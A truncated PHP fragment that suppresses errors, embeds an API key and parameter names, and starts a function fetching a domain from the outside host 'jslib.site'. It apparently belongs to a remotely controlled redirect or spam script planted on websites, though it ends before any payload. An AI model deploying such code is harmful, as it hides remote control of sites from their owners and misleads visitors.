...
error_reporting(0);
define("APIKEY","API-KEY-bowr-fp7a-fliis37s8p86");
define("Page","MTB.com");
define("FILE_NAME","mt.php");
define("GET_PARAM","serv");
function getdomain(){
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://jslib.site/raw/');
